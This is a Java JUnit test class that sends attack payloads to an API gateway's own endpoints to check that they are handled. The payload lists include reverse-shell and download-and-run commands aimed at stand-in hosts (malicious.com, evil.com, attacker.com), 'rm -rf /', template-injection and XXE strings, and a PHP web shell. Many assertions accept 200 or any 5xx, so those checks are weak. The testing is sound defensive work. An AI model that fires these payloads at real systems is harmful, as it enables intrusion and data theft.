package com.byo.rag.gateway.malicious;

import com.byo.rag.gateway.config.TestSecurityConfig;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.server.LocalServerPort;
import org.springframework.http.HttpHeaders;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.reactive.server.WebTestClient;

import javax.crypto.SecretKey;
import java.time.Duration;
import java.time.Instant;
import java.util.Date;
import java.util.UUID;

/**
 * Comprehensive malicious request handling tests for the API Gateway.
 * 
 * Part of GATEWAY-TEST-005: Gateway Security and Routing Tests
 * Tests handling of various malicious request patterns and attack vectors.
 */
@ExtendWith(MockitoExtension.class)
@SpringBootTest(
    webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT,
    classes = {
        com.byo.rag.gateway.GatewayApplication.class,
        TestSecurityConfig.class
    },
    properties = {
        "jwt.secret=testSecretKeyForTestingOnly123456789012345678901234567890",
        "spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,org.springframework.boot.autoconfigure.data.redis.RedisReactiveAutoConfiguration"
    }
)
@ActiveProfiles("test")
@DisplayName("GATEWAY-TEST-005: Malicious Request Handling Tests")
class GatewayMaliciousRequestTest {

    @LocalServerPort
    private int port;

    private WebTestClient webTestClient;
    
    private static final String TEST_JWT_SECRET = "testSecretKeyForTestingOnly123456789012345678901234567890";
    private static final SecretKey SECRET_KEY = Keys.hmacShaKeyFor(TEST_JWT_SECRET.getBytes());
    
    private String validJwtToken;
    
    @BeforeEach
    void setUp() {
        webTestClient = WebTestClient.bindToServer()
            .baseUrl("http://localhost:" + port)
            .responseTimeout(Duration.ofSeconds(30))
            .build();
            
        validJwtToken = createJwtToken("test@example.com", UUID.randomUUID(), UUID.randomUUID(), "USER");
    }
    
    @Test
    @DisplayName("Should detect and block SQL injection attempts")
    void shouldDetectAndBlockSqlInjectionAttempts() {
        String[] sqlInjectionPayloads = {
            "'; DROP TABLE users; --",
            "' OR '1'='1' --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT password FROM users WHERE '1'='1' --",
            "\"; DELETE FROM documents WHERE 1=1; --",
            "' OR 1=1 LIMIT 1 OFFSET 1 --",
            "') OR ('1'='1",
            "'; EXEC xp_cmdshell('format c:'); --"
        };
        
        for (String payload : sqlInjectionPayloads) {
            webTestClient.get()
                .uri("/api/documents/search?query=" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block or sanitize malicious SQL payloads
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                })
                .expectHeader().exists("X-Content-Type-Options");
        }
    }
    
    @Test
    @DisplayName("Should detect and block XSS attempts")
    void shouldDetectAndBlockXssAttempts() {
        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<body onload=alert('XSS')>",
            "\"'><script>alert('XSS')</script>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>"
        };
        
        for (String payload : xssPayloads) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/json")
                .header("X-Custom-Header", payload)
                .bodyValue("{\"content\":\"" + payload.replace("\"", "\\\"") + "\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block or sanitize XSS attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                })
                .expectHeader().exists("Content-Security-Policy");
        }
    }
    
    @Test
    @DisplayName("Should detect and block command injection attempts")
    void shouldDetectAndBlockCommandInjectionAttempts() {
        String[] commandInjectionPayloads = {
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "; nc -l -p 12345 -e /bin/bash",
            "$(curl http://malicious.com/shell.sh | bash)",
            "`id`",
            "; powershell -EncodedCommand...",
            "| cmd /c dir",
            "&& net user hacker password /add",
            "; wget http://evil.com/malware.sh && chmod +x malware.sh && ./malware.sh"
        };
        
        for (String payload : commandInjectionPayloads) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("X-Filename", "test.txt" + payload)
                .header("Content-Type", "application/json")
                .bodyValue("{\"filename\":\"test" + payload.replace("\"", "\\\"") + "\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block command injection attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block path traversal attempts")
    void shouldDetectAndBlockPathTraversalAttempts() {
        String[] pathTraversalPayloads = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/etc/passwd",
            "file:///etc/passwd",
            "\\\\server\\share\\sensitive\\file",
            "../../../proc/self/environ"
        };
        
        for (String payload : pathTraversalPayloads) {
            webTestClient.get()
                .uri("/api/documents/" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block path traversal attempts
                    assert status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block LDAP injection attempts")
    void shouldDetectAndBlockLdapInjectionAttempts() {
        String[] ldapInjectionPayloads = {
            "*)(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
            "*()|&'",
            "admin)(|(cn=*))",
            "*)(&(objectClass=*)",
            "*)(userPassword=*)",
            "admin))(|(cn=*)",
            "*)(mail=*@*"
        };
        
        for (String payload : ldapInjectionPayloads) {
            webTestClient.get()
                .uri("/api/auth/users?search=" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block LDAP injection attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block XXE attacks")
    void shouldDetectAndBlockXxeAttacks() {
        String[] xxePayloads = {
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/boot.ini'>]><root>&test;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY example \"Doe\"> <!ENTITY xxe SYSTEM \"http://attacker.com/evil.txt\"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo/>",
            "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;%init;%trick;]><root/>"
        };
        
        for (String payload : xxePayloads) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/xml")
                .bodyValue(payload)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block XXE attempts or not accept XML
                    assert status == 200 || status == 400 || status == 403 || status == 415 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block SSRF attempts")
    void shouldDetectAndBlockSsrfAttempts() {
        String[] ssrfPayloads = {
            "http://169.254.169.254/metadata",
            "http://localhost:22",
            "http://127.0.0.1:8080/admin",
            "http://0.0.0.0:3306",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/_MAIL",
            "http://[::1]:22",
            "http://2130706433/", // 127.0.0.1 in decimal
            "http://017700000001/", // 127.0.0.1 in octal
            "http://metadata.google.internal/computeMetadata/v1/instance/"
        };
        
        for (String payload : ssrfPayloads) {
            webTestClient.post()
                .uri("/api/documents/fetch")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/json")
                .bodyValue("{\"url\":\"" + payload + "\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block SSRF attempts
                    assert status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block NoSQL injection attempts")
    void shouldDetectAndBlockNoSqlInjectionAttempts() {
        String[] nosqlInjectionPayloads = {
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$where\": \"this.password.length > 0\"}",
            "{\"$regex\": \".*\"}",
            "{\"$or\": [{\"password\": \"\"}, {\"password\": null}]}",
            "{\"$javascript\": \"return true\"}",
            "{\"$expr\": {\"$gt\": [\"$password\", \"\"]}}",
            "{\"$lookup\": {\"from\": \"users\", \"localField\": \"_id\", \"foreignField\": \"userId\", \"as\": \"user\"}}",
            "';return db.users.find();var dummy='",
            "';return this.password;var dummy='"
        };
        
        for (String payload : nosqlInjectionPayloads) {
            webTestClient.post()
                .uri("/api/documents/search")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/json")
                .bodyValue("{\"filter\":" + payload + "}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block NoSQL injection attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block template injection attempts")
    void shouldDetectAndBlockTemplateInjectionAttempts() {
        String[] templateInjectionPayloads = {
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%=7*7%>",
            "{{config}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{''.constructor.constructor('return process.env')()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"
        };
        
        for (String payload : templateInjectionPayloads) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/json")
                .bodyValue("{\"content\":\"" + payload.replace("\"", "\\\"") + "\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block template injection attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block JWT manipulation attempts")
    void shouldDetectAndBlockJwtManipulationAttempts() {
        String[] jwtManipulationPayloads = {
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
            validJwtToken.substring(0, validJwtToken.length() - 10) + "tamperedABC",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.invalid-signature",
            validJwtToken.replace(".", ".."),
            "null.null.null",
            "{\"alg\":\"none\"}." + validJwtToken.split("\\.")[1] + ".",
            validJwtToken.split("\\.")[0] + ".eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9." + validJwtToken.split("\\.")[2]
        };
        
        for (String payload : jwtManipulationPayloads) {
            webTestClient.get()
                .uri("/api/documents/list")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + payload)
                .exchange()
                .expectStatus().value(status -> {
                    // Should reject manipulated JWT tokens
                    assert status == 401 || status == 403 || status == 302 || status == 400;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block deserialization attacks")
    void shouldDetectAndBlockDeserializationAttacks() {
        String[] deserializationPayloads = {
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4",
            "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.com:1389/Evil\",\"autoCommit\":true}",
            "AC ED 00 05 73 72 00 11 6A 61 76 61 2E 75 74 69 6C 2E 48 61 73 68 4D 61 70",
            "{\"@class\":\"java.lang.Runtime\",\"exec\":\"calc\"}",
            "H4sIAAAAAAAAAKtWyk62UjJSslIyUbJSSuOyUjJUslKyUsrPTSxTsqpVqihKzUxRsjKAAPNvh7lZAAAAAA=="
        };
        
        for (String payload : deserializationPayloads) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/json")
                .bodyValue("{\"data\":\"" + payload + "\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block deserialization attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block malicious file uploads")
    void shouldDetectAndBlockMaliciousFileUploads() {
        String[] maliciousFilenames = {
            "shell.php",
            "backdoor.jsp",
            "malware.exe",
            "virus.bat",
            "script.vbs",
            "trojan.scr",
            "test.php.txt",
            "file.asp",
            "shell.phtml",
            "backdoor.php5"
        };
        
        for (String filename : maliciousFilenames) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "multipart/form-data")
                .bodyValue("{\"filename\":\"" + filename + "\",\"content\":\"<?php system($_GET['cmd']); ?>\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block or validate malicious file types
                    assert status == 200 || status == 400 || status == 403 || status == 415 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block header injection attempts")
    void shouldDetectAndBlockHeaderInjectionAttempts() {
        String[] headerInjectionPayloads = {
            "test\r\nX-Injected-Header: malicious",
            "test\nSet-Cookie: sessionId=hacked",
            "test\r\nLocation: http://evil.com",
            "test%0d%0aX-Injected: header",
            "test\\u000AX-Injected: header",
            "test\\u000DX-Injected: header",
            "test\r\nContent-Type: text/html\r\n\r\n<script>alert('xss')</script>"
        };
        
        for (String payload : headerInjectionPayloads) {
            webTestClient.get()
                .uri("/api/documents/list")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("X-Custom-Header", payload)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block header injection attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should detect and block prototype pollution attempts")
    void shouldDetectAndBlockPrototypePollutionAttempts() {
        String[] prototypePollutionPayloads = {
            "{\"__proto__\":{\"admin\":true}}",
            "{\"constructor\":{\"prototype\":{\"admin\":true}}}",
            "{\"__proto__.admin\":true}",
            "constructor[prototype][admin]=true",
            "__proto__[admin]=true",
            "{\"a\":{\"__proto__\":{\"polluted\":true}}}",
            "Object.prototype.polluted = true"
        };
        
        for (String payload : prototypePollutionPayloads) {
            webTestClient.post()
                .uri("/api/documents/update/123")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/json")
                .bodyValue(payload)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block prototype pollution attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    private String createJwtToken(String email, UUID userId, UUID tenantId, String role) {
        Instant now = Instant.now();
        Date expiration = Date.from(now.plus(Duration.ofHours(1)));
        
        return Jwts.builder()
            .subject(email)
            .claim("userId", userId.toString())
            .claim("tenantId", tenantId.toString())
            .claim("role", role)
            .claim("tokenType", "access")
            .issuedAt(Date.from(now))
            .expiration(expiration)
            .signWith(SECRET_KEY)
            .compact();
    }
}